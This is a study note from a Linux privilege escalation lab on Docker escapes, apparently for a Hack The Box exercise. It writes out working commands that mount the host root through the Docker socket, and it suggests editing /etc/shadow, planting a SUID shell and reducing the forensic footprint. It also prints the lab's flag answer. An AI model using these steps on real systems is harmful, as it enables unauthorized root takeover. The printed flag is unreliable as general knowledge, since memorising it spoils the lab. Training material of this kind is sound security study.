# Section 15 — Docker

## ID
533

## Module
Linux Privilege Escalation

## Kind
notes

## Title
Section 15 — Docker

## Description
Covers multiple Docker privilege escalation vectors — docker group abuse, exposed Docker sockets, shared directory escape, and socket-based container spawning — all leading to full host filesystem access as root.

## Tags
privesc, docker, containers, group-abuse, docker-socket, linux

## Commands
- id
- docker image ls
- docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it <IMAGE> chroot /mnt bash
- docker -H unix:///var/run/docker.sock ps
- docker -H unix:///var/run/docker.sock run --rm -d --privileged -v /:/hostsystem <IMAGE>
- docker -H unix:///var/run/docker.sock exec -it <CONTAINER_ID> /bin/bash
- ls -al /var/run/docker.sock

## What This Section Covers
Docker privilege escalation exploits the fact that controlling the Docker daemon is equivalent to root access. If a user is in the `docker` group, has access to a writable Docker socket, or is inside a container with the socket mounted, they can spawn a new container that mounts the host filesystem and gain full read/write access to the host as root. The section covers three main vectors: docker group membership, exposed/writable Docker sockets, and shared directory escapes.

## Methodology
1. Check if the user is in the `docker` group with `id` — also check for SUID on the docker binary or sudo permissions.
2. List available images with `docker image ls` — you need at least one image to spawn a container.
3. **Docker group / writable socket** — mount the host root and chroot into it: `docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash`.
4. **Inside a container with exposed socket** — find the socket (`ls -al` looking for `docker.sock`), download the docker binary if needed, enumerate running containers with `docker -H unix:///path/docker.sock ps`, then spawn a new privileged container mounting `/` from the host.
5. **Shared directory escape** — enumerate non-standard directories in the container filesystem, look for mounted host paths containing SSH keys, credentials, or sensitive files.
6. From any of these vectors, read flags, grab SSH keys, edit `/etc/shadow`, or plant a SUID shell.

## Multi-step Workflow (optional)
```
# Verify docker group membership
id

# List images
docker image ls

# Spawn container with host root mounted, chroot into host
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash

# Now effectively root on host
cat /root/flag.txt
```

## Lab — Questions & Answers
| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Q1 — Submit contents of flag.txt in /root | HTB{D0ck3r_Pr1vE5c} | docker group → mounted host root → chroot → cat flag |

## Key Takeaways
- **Docker group = root.** Same lesson as LXD — if `id` shows `docker`, the box is owned. Always check group memberships early.
- The `chroot /mnt bash` trick is elegant: instead of navigating to `/mnt/root/flag.txt`, chroot makes the container's view of the filesystem identical to the host, so `/root/flag.txt` works directly.
- Three distinct Docker privesc vectors to remember: (1) docker group membership on the host, (2) writable Docker socket from inside a container (escape), (3) shared/mounted host directories leaking secrets.
- The `--rm` flag auto-removes the container on exit — good operational hygiene, reduces forensic footprint.
- Inside a container, if `docker` binary isn't installed, you can download a static binary from the Docker website and use it to interact with an exposed socket.

## Gotchas
- If no images are available locally and the host has no internet, you can't pull one — check `docker image ls` first. You may need to `docker save`/`docker load` an image from your attack box.
- The Docker socket path is usually `/var/run/docker.sock` but inside containers it could be mounted anywhere (e.g., `/app/docker.sock`) — always search for it with `find / -name docker.sock 2>/dev/null`.
- The `-v /:/mnt` flag maps the host's `/` to the container's `/mnt`. Combined with `chroot /mnt bash`, your working directory becomes the host filesystem — don't confuse paths between host and container context.
